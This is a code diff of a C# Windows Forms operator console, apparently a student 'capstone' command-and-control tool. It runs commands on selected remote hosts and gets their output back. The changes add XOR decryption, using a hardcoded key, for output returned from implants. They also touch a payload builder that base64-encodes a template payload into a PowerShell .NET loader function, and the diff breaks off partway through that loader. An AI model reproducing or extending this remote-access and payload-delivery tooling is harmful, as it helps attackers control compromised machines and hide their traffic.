@@ -16,6 +16,8 @@ using System.Data.SqlClient;
 using MySql.Data.MySqlClient;
 using Newtonsoft.Json;
 using System.Net.Http;
+using Microsoft.Toolkit.Uwp.Notifications;
+using System.Net;
 
 namespace CapstoneInterface
 {
@@ -89,7 +91,7 @@ namespace CapstoneInterface
 
 
         private async void btnRunCommand_Click(object sender, EventArgs e)
-        {
+        {         
             foreach (DataGridViewRow row in dataGridView1.Rows)
             {
                 bool isChecked = Convert.ToBoolean(row.Cells["Check"].Value);
@@ -174,15 +176,36 @@ namespace CapstoneInterface
 
             if (outputResponse.IsSuccessStatusCode)
             {
-                string jsonResponse = await outputResponse.Content.ReadAsStringAsync();
-                dynamic outputObj = JsonConvert.DeserializeObject(jsonResponse);
+                // Fetch output as base64 string
+                string outputBase64 = await outputResponse.Content.ReadAsStringAsync();
 
-                string outputBase64 = outputObj.Output;
-                string output = Encoding.UTF8.GetString(Convert.FromBase64String(outputBase64));
-                txtConsoleOutput.AppendText("\r\n\r\n" + "Receiving " + output.Length + " bytes from " + user);
+                // Base64 decode the string to get byte array
+                byte[] outputBytes = Convert.FromBase64String(outputBase64);
+
+                // Decode XORKey
+                string XORKeyB64 = "NVm5dzr1hyhOm4jBTNSFhQGrFhR1gvhbn/BbvZowkO0=";
+                byte[] XORKey = Convert.FromBase64String(XORKeyB64);
+
+                // Decrypt the XOR-encoded output bytes
+                byte[] decryptedOutputBytes = XOR(outputBytes, XORKey);
+
+                // Convert the decrypted output bytes back to string
+                string decryptedOutput = Encoding.UTF8.GetString(decryptedOutputBytes);
+
+                // Parse JSON
+                dynamic outputObj = JsonConvert.DeserializeObject(decryptedOutput);
+
+                // Base64 decode the Output field
+                string outputContentBase64 = outputObj.Output;
+                byte[] outputContentBytes = Convert.FromBase64String(outputContentBase64);
+                string outputContent = Encoding.UTF8.GetString(outputContentBytes);
+
+                txtConsoleOutput.AppendText("\r\n\r\n" + "Receiving " + outputContent.Length + " bytes from " + user);
                 await Task.Delay(2000);
-                txtConsoleOutput.AppendText("\r\n\r\n" + output);
+                txtConsoleOutput.AppendText("\r\n\r\n" + outputContent);
             }
+
+
             else
             {
                 txtConsoleOutput.AppendText($"\r\nFailed to fetch output. Status code: {outputResponse.StatusCode}");
@@ -190,6 +213,18 @@ namespace CapstoneInterface
                 txtConsoleOutput.AppendText($"\r\nError content: {errorContent}");
             }
         }
+
+        public static byte[] XOR(byte[] data, byte[] key)
+        {
+            byte[] result = new byte[data.Length];
+            for (int i = 0; i < data.Length; i++)
+            {
+                result[i] = (byte)(data[i] ^ key[i % key.Length]);
+            }
+            return result;
+        }
+
+
 
         private void dataGridView1_CellContentClick(object sender, DataGridViewCellEventArgs e)
         {
@@ -269,8 +304,8 @@ namespace CapstoneInterface
         private async void btnBundlePayload_Click(object sender, EventArgs e)
         {
             txtPayloadGen.Text = "";
-            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(templatePayload);
-            var b64encodedPayload = System.Convert.ToBase64String(plainTextBytes);
+            var plainTextBytes = Encoding.UTF8.GetBytes(templatePayload);
+            var b64encodedPayload = Convert.ToBase64String(plainTextBytes);
             var powerShellNETLoader = @"function Invoke-Run() {
     $encodedSource = '" + b64encodedPayload + @"'
     $bytes = [Convert]::FromBase64String($encodedSource)
